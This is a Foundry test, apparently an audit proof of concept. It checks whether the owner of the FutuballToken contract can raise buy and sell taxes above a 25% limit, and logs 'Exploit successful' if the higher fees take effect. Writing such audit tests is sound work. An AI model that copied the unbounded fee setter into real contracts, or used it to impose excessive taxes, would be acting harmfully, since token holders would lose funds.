// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FutuballToken.sol";

contract FutuballTaxTest is Test {
    FutuballToken token;
    address owner = address(0x1);
    address mockRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address mockFactory = address(0xfAc7);
    address mockWETH = address(0x1);
    address mockPair = address(0x1234);

    function setUp() public {
        vm.startPrank(owner);
        
        // Mock external dependencies
        vm.mockCall(
            mockRouter,
            abi.encodeWithSignature("factory()"),
            abi.encode(mockFactory)
        );
        vm.mockCall(
            mockRouter,
            abi.encodeWithSignature("WETH()"),
            abi.encode(mockWETH)
        );
        vm.mockCall(
            mockFactory,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(mockPair)
        );
        
        token = new FutuballToken();
        vm.stopPrank();
    }

    function test_fees_can_be_set_above_25_percent() public {
        console.log("--- BEFORE-Trigger Tax Fees ---");
        uint256 initialBuyTax = token.buyTaxFee();
        uint256 initialSellTax = token.sellTaxFee();
        console.log("Initial Buy Tax Fee:", initialBuyTax);
        console.log("Initial Sell Tax Fee:", initialSellTax);

        console.log("--- Trigger SetTax (26%) ---");
        uint256 highBuyTax = 26;
        uint256 highSellTax = 26;
        vm.prank(owner);
        token.setTax(highSellTax, highBuyTax);
        console.log("Attempted to set both taxes to 26%");

        console.log("--- AFTER-Trigger Tax Fees ---");
        uint256 newBuyTax = token.buyTaxFee();
        uint256 newSellTax = token.sellTaxFee();
        console.log("New Buy Tax Fee:", newBuyTax);
        console.log("New Sell Tax Fee:", newSellTax);

        bool buyTaxChangedAndHigh = (newBuyTax == highBuyTax) && (newBuyTax != initialBuyTax);
        bool sellTaxChangedAndHigh = (newSellTax == highSellTax) && (newSellTax != initialSellTax);
        bool vulnerabilityTriggered = buyTaxChangedAndHigh && sellTaxChangedAndHigh;

        console.log("Taxes changed to 26%:", vulnerabilityTriggered ? "YES" : "NO");
        console.log("Exploit successful:", vulnerabilityTriggered ? "YES" : "NO");

        if (vulnerabilityTriggered) {
            console.log("Vulnerability Exists: fees successfully set above 25% limit");
        } else if (newBuyTax == highBuyTax && newSellTax == highSellTax) {
            console.log("Vulnerability not Exist: fees were already set to 26% (proper enforcement not tested)");
        } else {
            console.log("Vulnerability not Exist: tax fees remain within 25% limit after operation");
        }
    }
}